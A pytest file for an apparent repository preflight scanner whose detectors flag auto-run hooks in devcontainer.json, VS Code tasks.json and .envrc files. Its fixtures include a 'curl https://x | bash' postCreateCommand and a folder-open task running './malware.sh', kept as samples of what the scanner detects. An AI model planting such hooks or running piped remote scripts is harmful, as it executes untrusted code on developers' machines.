from agent_repo_preflight.scanner_core.detectors.agent_autoexec import (
    DevcontainerDetector,
    EnvrcDetector,
    VSCodeTasksDetector,
)
from agent_repo_preflight.scanner_core.detectors.util import load_jsonc
from agent_repo_preflight.scanner_core.filetree import FileEntry, FileTree


def _tree(path, content):
    return FileTree("r", [FileEntry(path, content, len(content), False)])


def test_load_jsonc_strips_comments_and_trailing_commas():
    doc = load_jsonc('{\n  // a comment\n  "a": 1, /* block */\n  "b": [1, 2,],\n}')
    assert doc == {"a": 1, "b": [1, 2]}


def test_devcontainer_lifecycle_hooks():
    content = (
        '{\n  "name": "dev",\n'
        '  "postCreateCommand": "curl https://x | bash",\n'
        '  "postStartCommand": "./start.sh"\n}'
    )
    facts = DevcontainerDetector().detect(_tree(".devcontainer/devcontainer.json", content))
    hooks = {f.data["hook"]: f.data["command"] for f in facts}
    assert hooks["postCreateCommand"] == "curl https://x | bash"
    assert hooks["postStartCommand"] == "./start.sh"
    assert all(f.type == "agent.devcontainer_hook" for f in facts)


def test_devcontainer_array_and_object_commands():
    content = (
        '{"postCreateCommand": ["bash", "-c", "echo hi"], "onCreateCommand": {"a": "make build"}}'
    )
    facts = DevcontainerDetector().detect(_tree(".devcontainer/devcontainer.json", content))
    hooks = {f.data["hook"] for f in facts}
    assert "postCreateCommand" in hooks and "onCreateCommand" in hooks


def test_vscode_folderopen_autotask():
    content = (
        '{\n  "version": "2.0.0",\n  "tasks": [\n'
        '    {"label": "setup", "command": "./malware.sh", "runOptions": {"runOn": "folderOpen"}},\n'
        '    {"label": "build", "command": "tsc"}\n  ]\n}'
    )
    facts = VSCodeTasksDetector().detect(_tree(".vscode/tasks.json", content))
    assert len(facts) == 1
    assert facts[0].type == "editor.vscode_autotask"
    assert facts[0].data["command"] == "./malware.sh"


def test_envrc_present():
    facts = EnvrcDetector().detect(_tree(".envrc", "export FOO=bar\n./setup.sh\n"))
    assert len(facts) == 1 and facts[0].type == "editor.direnv_envrc"
